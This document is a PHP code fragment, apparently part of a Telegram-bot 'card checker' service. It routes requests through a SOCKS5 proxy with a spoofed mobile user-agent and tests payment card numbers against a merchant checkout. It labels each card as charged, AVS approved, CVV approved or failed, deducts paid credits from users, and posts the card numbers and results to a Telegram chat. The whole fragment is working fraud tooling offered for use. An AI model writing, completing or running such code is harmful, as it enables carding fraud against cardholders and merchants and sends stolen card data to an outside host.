curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/Tools/cookie.txt');
$curl10 = curl_exec($ch);
$Messagesuccess = trim(strip_tags(getStr($curl10,'<h1 class="visually-hidden">','</h1>')));
curl_close($ch);

if ((strpos($curl10, 'Thank you for your purchase')) or (strpos($curl9, 'AVS REJECTED')) or (strpos($curl9, 'Insufficient funds')))
{ $creditsToDeduct = 2;} 
else 
{ $creditsToDeduct = 1;}
$creditsFile = fopen('Tools/Credits.txt', 'r+');
while (!feof($creditsFile)) {
    $line = fgets($creditsFile);
    $lineParts = explode(' ', $line);
    $userIdd = trim($lineParts[0]);
    $credits = intval(trim($lineParts[1]));
    if ($userIdd == $userId) {
        $newCredits = max(0, $credits - $creditsToDeduct);
        fseek($creditsFile, -strlen($line), SEEK_CUR);
        fwrite($creditsFile, "$userId $newCredits\n");
        break;}}
fclose($creditsFile);
  
if (strpos($curl10, 'Thank you for your purchase')) {
$ccrsp = "--» <u>Card 💳</u> : <code>$cards</code>\n--» <u>Status </u> : ✅ Charged 15$ ( $Messagesuccess )";
}
elseif (strpos($curl9, 'AVS REJECTED')){
$ccrsp = "--» <u>Card 💳</u> : <code>$cards</code>\n--» <u>Status </u> : ✅ AVS APPROVED ( $rsppppp )";
}
elseif (strpos($curl9, 'Insufficient funds')){
$ccrsp = "--» <u>Card 💳</u> : <code>$cards</code>\n--» <u>Status </u> : ✅ APPROVED CVV ( $rsppppp )";
}
else{
$ccrsp = "--» <u>Card 💳</u> : <code>$cards</code>\n--» <u>Status </u> : ❌ Failed To Charge ( $rsppppp )";
}

$file = 'file.txt';
$current = file_get_contents($file);
$current .= $ccrsp . "\n\n";
file_put_contents($file, $current);
$allrsp = file_get_contents($file);
  
$url = 'https://api.telegram.org/bot' . $bot_token . '/sendMessage';
$data = http_build_query(array(
    'chat_id' => $chat_id,
    'text' => "$allrsp | $checkedCards | $numcc |",
    'reply_to_message_id' => $message_id,
    'parse_mode' => 'HTML'
));
sendAsyncRequest($url, $data);
$checkedCards++;
  if ($checkedCards === $numcc) {
        break;
    }
}
exit();
?>